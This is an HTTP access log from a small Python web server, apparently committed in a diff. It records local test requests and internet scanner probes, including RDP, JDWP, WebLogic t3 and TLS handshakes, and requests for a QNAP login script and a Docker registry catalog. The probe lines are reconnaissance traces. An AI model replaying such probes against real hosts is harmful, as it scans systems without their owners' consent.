+127.0.0.1 - - [15/Sep/2024 11:41:10] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 11:41:19] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 11:51:33] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 11:51:33] "GET /security_check/123/123 HTTP/1.1" 200 -
+138.68.186.104 - - [15/Sep/2024 13:59:40] code 400, message Bad request version ('+\x94\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+138.68.186.104 - - [15/Sep/2024 13:59:40] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03gn\x92{º@ª\x82_éNe x\x90#\x13\x01\x92ÅÀ°UûêSb\x1b\x0e\x09+\x94\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+178.159.37.98 - - [15/Sep/2024 14:02:42] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [15/Sep/2024 14:02:42] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+185.147.124.64 - - [15/Sep/2024 14:55:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.147.124.64 - - [15/Sep/2024 14:55:28] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/Sep/2024 15:05:41] "GET / HTTP/1.1" 200 -
+111.7.96.148 - - [15/Sep/2024 15:06:19] code 400, message Bad request version ('À\x13À')
+111.7.96.148 - - [15/Sep/2024 15:06:19] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03I\x06²ù¼\x99iÀYûøºe-\x83Ud]\x0e\x8d·b8´gÆÝ9dZ8f gÁ\x81i³öòË°©\x19NÖ½\x95g|püé<Z¡\x90T·é¥8'O;\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+111.7.96.148 - - [15/Sep/2024 15:06:29] "GET / HTTP/1.1" 200 -
+103.14.33.76 - - [15/Sep/2024 15:17:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:25:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:25:09] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 15:25:13] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:25:13] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:35:16] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:35:16] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 15:35:22] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:35:22] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:36:09] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:36:12] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:36:12] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:38:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:38:19] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 15:38:24] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:38:24] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:47:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:48:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:48:58] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 15:49:08] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:49:08] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:53:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 15:53:25] "GET /favicon.ico HTTP/1.1" 404 -
+205.210.31.184 - - [15/Sep/2024 15:54:56] "GET / HTTP/1.1" 200 -
+34.214.137.252 - - [15/Sep/2024 15:55:35] "GET / HTTP/1.1" 200 -
+138.68.48.46 - - [15/Sep/2024 16:05:25] code 400, message Bad request version ('À\x14À')
+138.68.48.46 - - [15/Sep/2024 16:05:25] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03²\x9d\x90h7,´^á¶-ÈÊyg?÷\x18Î\x12·³ºq\x04\x13G4 \x94ùw\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+138.68.48.46 - - [15/Sep/2024 16:05:26] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03)þAí?ë:=êÆåI÷9]®í½\xadZÙ¬\x88#\x08Q\x0e\x8f"è\x16$\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+138.68.48.46 - - [15/Sep/2024 16:05:26] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03)þAí?ë:=êÆåI÷9]®í½­ZÙ¬\x88#\x08Q\x0e\x8f"è\x16$\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+138.68.48.46 - - [15/Sep/2024 16:05:26] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 17:17:42] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 17:17:42] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 17:17:47] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 17:17:47] "GET /security_check/123/123 HTTP/1.1" 200 -
+79.124.56.186 - - [15/Sep/2024 20:01:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [15/Sep/2024 20:01:02] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [15/Sep/2024 20:58:49] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 20:58:49] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 20:59:14] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 20:59:14] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 21:17:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 21:17:04] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [15/Sep/2024 21:17:10] "GET /idget/3 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 21:17:10] "GET /security_check/3/3 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 21:17:37] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 21:17:37] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [15/Sep/2024 23:49:57] "GET / HTTP/1.1" 200 -
+104.236.104.29 - - [16/Sep/2024 00:20:33] code 400, message Bad request syntax ('SSH-2.0-OpenSSH')
+104.236.104.29 - - [16/Sep/2024 00:20:33] "SSH-2.0-OpenSSH" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/Sep/2024 00:34:14] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 00:34:15] "GET / HTTP/1.1" 200 -
+205.210.31.52 - - [16/Sep/2024 03:10:30] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [16/Sep/2024 03:34:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 04:20:47] "GET / HTTP/1.1" 200 -
+45.84.89.2 - - [16/Sep/2024 04:40:34] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [16/Sep/2024 04:40:34] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+178.159.37.98 - - [16/Sep/2024 04:52:29] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+178.159.37.98 - - [16/Sep/2024 04:52:29] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+115.231.78.7 - - [16/Sep/2024 05:10:14] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [16/Sep/2024 05:10:14] "GET / HTTP/1.1" 200 -
+115.231.78.7 - - [16/Sep/2024 05:10:14] "GET /favicon.ico HTTP/1.1" 404 -
+115.231.78.7 - - [16/Sep/2024 05:10:15] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 05:55:07] "GET / HTTP/1.1" 200 -
+79.124.56.186 - - [16/Sep/2024 06:01:17] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [16/Sep/2024 06:01:17] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+147.185.132.135 - - [16/Sep/2024 06:24:51] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 08:41:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 08:41:12] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 08:41:20] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 08:41:20] "GET /security_check/123/123 HTTP/1.1" 200 -
+185.234.216.112 - - [16/Sep/2024 10:23:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [16/Sep/2024 10:23:27] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+111.7.96.154 - - [16/Sep/2024 10:55:33] "GET / HTTP/1.1" 200 -
+111.7.96.154 - - [16/Sep/2024 10:55:35] "GET / HTTP/1.1" 200 -
+111.7.96.154 - - [16/Sep/2024 10:55:39] "GET /favicon.ico HTTP/1.1" 404 -
+125.122.15.166 - - [16/Sep/2024 10:55:43] "GET / HTTP/1.1" 200 -
+125.122.15.166 - - [16/Sep/2024 10:55:43] "GET / HTTP/1.1" 200 -
+125.122.15.166 - - [16/Sep/2024 10:55:46] "GET /favicon.ico HTTP/1.1" 404 -
+113.141.85.182 - - [16/Sep/2024 10:59:17] "GET / HTTP/1.1" 200 -
+113.141.85.182 - - [16/Sep/2024 10:59:17] "GET / HTTP/1.1" 200 -
+113.141.85.182 - - [16/Sep/2024 10:59:22] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 11:31:25] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 11:50:03] "GET /ui/favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 11:50:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 11:50:03] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 12:23:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 12:23:12] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 12:23:14] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 12:28:30] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 12:28:30] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 12:28:48] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 12:28:48] "GET /security_check/123/123 HTTP/1.1" 200 -
+172.206.143.210 - - [16/Sep/2024 12:47:11] "GET /v2/ HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 13:27:30] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [16/Sep/2024 14:33:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [16/Sep/2024 14:33:06] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+154.213.185.206 - - [16/Sep/2024 14:42:29] code 400, message Bad request syntax ('JDWP-Handshake')
+154.213.185.206 - - [16/Sep/2024 14:42:29] "JDWP-Handshake" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/Sep/2024 16:15:23] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 16:15:23] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 16:15:27] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 16:15:27] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 16:15:33] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 16:15:33] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:40:11] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:40:11] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 17:40:16] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:40:16] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:42:03] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:42:03] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 17:42:07] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:42:07] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:42:46] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 17:42:46] "GET /security_check/123/123 HTTP/1.1" 200 -
+79.124.49.202 - - [16/Sep/2024 17:55:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.49.202 - - [16/Sep/2024 17:55:25] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/Sep/2024 18:01:59] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 18:01:59] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 19:03:58] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 19:03:58] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 19:04:18] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 19:04:18] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 19:07:59] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 19:07:59] "GET /security_check/123/123 HTTP/1.1" 200 -
+83.222.190.78 - - [16/Sep/2024 19:10:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [16/Sep/2024 19:10:12] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/Sep/2024 19:15:49] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 19:15:50] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [16/Sep/2024 19:15:51] "GET / HTTP/1.1" 200 -
+165.154.6.82 - - [16/Sep/2024 21:35:33] "GET / HTTP/1.1" 200 -
+165.154.6.82 - - [16/Sep/2024 21:35:33] code 400, message Bad request version ('§Áa±Hr')
+165.154.6.82 - - [16/Sep/2024 21:35:33] "\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03}\x88@1ç\x19Ô\x15\x95£\x1f SmÌl1\x00@"zÏ(\x94\x97ªá\x9f\x82\x8a\x8a] +\x05%á<i<ï:1èm¾\x10P_y\x09a\x814 §Áa±Hr" HTTPStatus.BAD_REQUEST -
+165.154.6.82 - - [16/Sep/2024 21:35:34] code 400, message Bad HTTP/0.9 request type ('t3')
+165.154.6.82 - - [16/Sep/2024 21:35:34] "t3 12.1.2" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [16/Sep/2024 21:48:47] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [16/Sep/2024 23:45:38] "GET / HTTP/1.1" 200 -
+80.82.70.133 - - [17/Sep/2024 01:33:15] "GET / HTTP/1.0" 200 -
+198.235.24.39 - - [17/Sep/2024 02:38:50] "GET / HTTP/1.0" 200 -
+138.197.189.132 - - [17/Sep/2024 02:48:30] "GET / HTTP/1.0" 200 -
+46.101.132.15 - - [17/Sep/2024 02:48:30] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 -
+64.226.86.235 - - [17/Sep/2024 02:48:30] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+46.101.132.163 - - [17/Sep/2024 02:48:30] code 400, message Bad request version ('_')
+46.101.132.163 - - [17/Sep/2024 02:48:30] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03U\x16ïÔ\x96/6¤ªN\x07äxW['þÜ{öâÀ¨\x81t\x95Þ, \x8bfS ¬Ì×õ\x83ùì¢M¹\x17\x1a*6¶àB¨×ëôñX\x0c_" HTTPStatus.BAD_REQUEST -
+46.101.132.16 - - [17/Sep/2024 02:48:30] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01$\x01\x00\x01')
+46.101.132.16 - - [17/Sep/2024 02:48:30] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03(g¼ÓõÞ" HTTPStatus.BAD_REQUEST -
+164.90.229.192 - - [17/Sep/2024 02:48:30] "GET / HTTP/1.1" 200 -
+46.101.132.163 - - [17/Sep/2024 02:48:31] code 400, message Bad request version ('À\x13À')
+46.101.132.163 - - [17/Sep/2024 02:48:31] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x033¬Ãñqø\x8fâã\x1d\x9aR\x87\x7fÔ4\x99\x84±C\x08\x1fÚ6V\x04÷Õ¢\x93¬< TÎ¹/±\x04\x9bK\x83lâA\x0bRW¼ëO±\x82å\x7f¾ð\x87F\x88\x81Oå\x82\x8b\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+46.101.132.163 - - [17/Sep/2024 02:48:31] code 400, message Bad request version ('À\x13À')
+46.101.132.163 - - [17/Sep/2024 02:48:31] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03uhï\x0cKï&@ì<lÃwËõ9\\ßß[¾\x01(Exs0\x7f;¬<\x1b å4÷\x172\x1a$æî\x86\x88ä\x84\x0c\x870J\x02Îz¬LQ\x94tg\x11ð«´\x8cà\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [17/Sep/2024 03:28:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 03:28:17] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 03:28:18] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 03:28:18] "GET / HTTP/1.1" 200 -
+209.38.252.63 - - [17/Sep/2024 05:24:19] "GET / HTTP/1.0" 200 -
+165.227.172.224 - - [17/Sep/2024 05:24:19] "GET /v2/_catalog HTTP/1.1" 404 -
+68.183.214.134 - - [17/Sep/2024 05:24:19] "GET / HTTP/1.1" 200 -
+46.101.208.138 - - [17/Sep/2024 05:24:19] code 400, message Bad request version ('\x93Wa/|ÌÜä}ç')
+46.101.208.138 - - [17/Sep/2024 05:24:19] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03\x00:\x0d\x96\x99#ö)\x1fch\x09\x04`;«xøÍ@\x1fPYÇ\x05"\x99\x1fz"\x08\x0e ¯À]Ìê5\x00\x87^\x0c\x93Wa/|ÌÜä}ç" HTTPStatus.BAD_REQUEST -
+46.101.123.45 - - [17/Sep/2024 05:24:19] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 -
+46.101.208.49 - - [17/Sep/2024 05:24:19] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 404 -
+46.101.208.49 - - [17/Sep/2024 05:24:51] code 400, message Bad request version ('À\x13À')
+46.101.208.49 - - [17/Sep/2024 05:24:51] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Ý\x9a\x03/\x9cPJÕÚ¼F\x08¡¸n¦ëØ«è\x15\\\x1dùôÂê\x80¡\x88òµ nWSù4§±LÇÝ®²>PªJ\x0eÂL§.\x0b\x86\x8fä÷z÷{Ô\x08¥\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+46.101.208.49 - - [17/Sep/2024 05:24:51] code 400, message Bad request version ('À\x13À')
+46.101.208.49 - - [17/Sep/2024 05:24:51] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03)?\x10R:äb§\x82c\x04º.½\x17Ñð¼\x91Í¡Ò*Ø'D\x1dM\x80«ú9 ´b¿éÂ2Os7\\ 8j\\\x8eO²äØp¯®·Nè&\x84l\x07\x15±M\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+46.101.208.49 - - [17/Sep/2024 05:24:52] code 400, message Bad request version ('À\x13À')
+46.101.208.49 - - [17/Sep/2024 05:24:52] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03YáG´´\x83\x96ò°úþÆs\x95n,ET\x1fF\x7f@\x97uw\x9a¼££\x0d@# \x9a¢à\x81\x8d¯Û\x0dÑÓ\x10\x83Ï.I Ê\x08\x16è¼k¥lI\x08Tê\x8cúZ±\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
+121.225.149.104 - - [17/Sep/2024 05:26:49] code 400, message Bad request version ("+õÓ¢\x05ú\x11H\x19:\xadx?\x94@¸Å½r/ê>îU?\x08ÀûXhq2\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
+121.225.149.104 - - [17/Sep/2024 05:26:49] "\x16\x03\x01\x01 \x01\x00\x01\x1c\x03\x03\x18®Ël\x99hU6½\x81´zíã"Þã\x84d9Å>}3\x9c»P\x16Ù6óH +õÓ¢\x05ú\x11H\x19:­x?\x94@¸Å½r/ê>îU?\x08ÀûXhq2\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
+45.84.89.2 - - [17/Sep/2024 05:28:44] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+45.84.89.2 - - [17/Sep/2024 05:28:44] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\x00\x00\x06À0\x00\x9c\x00\x9d\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [17/Sep/2024 06:15:13] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 07:19:10] "GET /robots.txt HTTP/1.1" 404 -
+127.0.0.1 - - [17/Sep/2024 07:19:11] "GET /favicon.ico HTTP/1.1" 404 -
+79.124.56.186 - - [17/Sep/2024 08:46:30] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+79.124.56.186 - - [17/Sep/2024 08:46:30] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+198.235.24.82 - - [17/Sep/2024 09:22:07] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [17/Sep/2024 09:28:57] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [17/Sep/2024 09:28:57] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+127.0.0.1 - - [17/Sep/2024 10:34:37] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 10:34:37] "GET /favicon.ico HTTP/1.1" 404 -
+52.76.71.100 - - [17/Sep/2024 10:48:46] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [17/Sep/2024 11:04:47] "GET /idget/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 11:04:47] "GET /security_check/123/123 HTTP/1.1" 200 -
+127.0.0.1 - - [17/Sep/2024 11:26:24] "GET / HTTP/1.1" 200 -
+185.234.216.112 - - [17/Sep/2024 12:17:00] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [17/Sep/2024 12:17:00] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+71.6.146.186 - - [17/Sep/2024 12:44:40] "GET / HTTP/1.1" 200 -
+71.6.146.186 - - [17/Sep/2024 12:44:49] "GET /favicon.ico HTTP/1.1" 404 -
+162.142.125.216 - - [17/Sep/2024 12:53:19] "GET / HTTP/1.1" 200 -
+162.142.125.216 - - [17/Sep/2024 12:53:20] "GET /favicon.ico HTTP/1.1" 404 -
+162.142.125.216 - - [17/Sep/2024 12:53:21] code 505, message Invalid HTTP version (2.0)
+162.142.125.216 - - [17/Sep/2024 12:53:21] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+165.232.98.134 - - [17/Sep/2024 14:00:19] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03Kß9^¸B¥K\xadõ:þXí|¿')
+165.232.98.134 - - [17/Sep/2024 14:00:19] "\x16\x03\x01\x01þ\x01\x00\x01ú\x03\x03Kß9^¸B¥K­õ:þXí|¿\x0dÓ"\x80QÎ1l±î\x96C-ñ«Ø\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+83.222.190.78 - - [17/Sep/2024 14:51:22] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+83.222.190.78 - - [17/Sep/2024 14:51:22] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+185.234.216.112 - - [17/Sep/2024 15:01:02] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.234.216.112 - - [17/Sep/2024 15:01:02] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+165.227.48.150 - - [17/Sep/2024 16:40:03] code 400, message Bad request version ('À\x14À')
+165.227.48.150 - - [17/Sep/2024 16:40:03] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03xw\x1a\x19Ä\x0f6©ç,nCäsÇ¿Ò\x00à®Ïãk\x87Ým\x1dPÀ^­w\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.227.48.150 - - [17/Sep/2024 16:40:03] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03öêR¼V\xad¡©hÁÖ\x19*KÎ,e³ºÙÞj\x99àV\x9bÝAØØ6\x1a\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+165.227.48.150 - - [17/Sep/2024 16:40:03] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03öêR¼V­¡©hÁÖ\x19*KÎ,e³ºÙÞj\x99àV\x9bÝAØØ6\x1a\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+165.227.48.150 - - [17/Sep/2024 16:40:04] "GET / HTTP/1.1" 200 -
+52.76.71.100 - - [17/Sep/2024 16:42:38] "GET /favicon.ico HTTP/1.1" 404 -
+154.213.185.206 - - [17/Sep/2024 17:03:26] code 400, message Bad request syntax ('JDWP-Handshake')
